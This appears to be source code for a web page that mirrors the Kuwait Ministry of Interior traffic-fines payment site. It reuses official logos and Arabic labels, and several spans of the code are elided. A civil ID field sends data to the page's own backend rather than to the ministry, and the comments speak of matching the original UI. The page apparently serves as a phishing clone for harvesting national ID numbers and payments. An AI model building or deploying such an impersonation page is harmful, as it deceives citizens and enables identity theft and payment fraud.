...
export default function Home() {
  ...
  const queryMutation = trpc.fines.query.useMutation({
    onSuccess: (data) => {
      ...
      if (data.success) {
        setResults(data);
        // Show results in a way that matches the original UI
  ...
  useEffect(() => {
    ...
    // Handle form interactions in the mirrored HTML
  ...
  return (
    <div className="moi-mirrored-page">
      <style>{`
        .moi-mirrored-page { background-color: #e9e6de; min-height: 100vh; }
        #results-overlay { 
          position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
          background: white; padding: 30px; border-radius: 15px; box-shadow: 0 0 30px rgba(0,0,0,0.3);
          z-index: 10000; width: 90%; max-width: 500px; text-align: center;
        ...
        <div class="container" style="background-image: url('https://www.moi.gov.kw/main/images/assets/common/bg-pattern.png'); background-repeat: repeat;">
          <header>
            <div class="row pt-3">
              ...
              <div class="col-8 col-md-10 text-right align-self-center">
                <img src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg" style="height: 30px; margin-bottom: 5px;"><br>
                <img src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg" style="height: 25px;">
              </div>
            </div>
          </header>

          <nav class="navbar navbar-expand-lg navbar-dark mt-3" style="background-color: #000576;">
            <div class="container">
          ...
          <div class="row mt-4">
            <div class="col-lg-3 d-none d-lg-block">
              <div class="list-group" style="background-color: #000576;">
                ...
                <a href="#" class="list-group-item list-group-item-action text-white bg-transparent border-light d-flex justify-content-between align-items-center">
                  دفع المخالفات
                  <img src="https://www.moi.gov.kw/main/images/assets/common/ico-payment.svg" style="width: 24px;">
                </a>
              </div>
            </div>

            <div class="col-lg-9">
              <div class="card p-4 shadow-sm" style="background: transparent; border: none;">
                <div class="text-center mb-4">
                  <img src="https://www.moi.gov.kw/main/images/assets/general-traffic/logo-general-traffic.svg" style="height: 80px;">
                  <h4 class="mt-2" style="color: #000576; font-weight: bold;">الإدارة العامة للمرور</h4>
                  <hr style="width: 50%; border-top: 2px solid #000576;">
                </div>

                <div class="form-group text-right">
                  <label class="font-weight-bold">Enquiry Type</label>
                ...
                <div class="form-group text-right">
                  <label class="font-weight-bold">الرقم المدني أو الرقم الموحد</label>
                  <input type="text" id="civilId" class="form-control text-right" placeholder="أدخل الرقم المدني">
                </div>

                <button id="btnEnquire" class="btn btn-outline-primary btn-block font-weight-bold" style="border-color: #000576; color: #000576;">إستعلم</button>
                
                <p class="text-center mt-3 small font-weight-bold">
                  بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                </p>

                <div class="d-flex justify-content-center mt-3">
                  <span class="badge badge-success p-2 m-1">قابلة للدفع الكترونياً</span>
                  <span class="badge badge-danger p-2 m-1">غير قابلة للدفع الكترونياً</span>
                </div>
              </div>
            </div>
          </div>
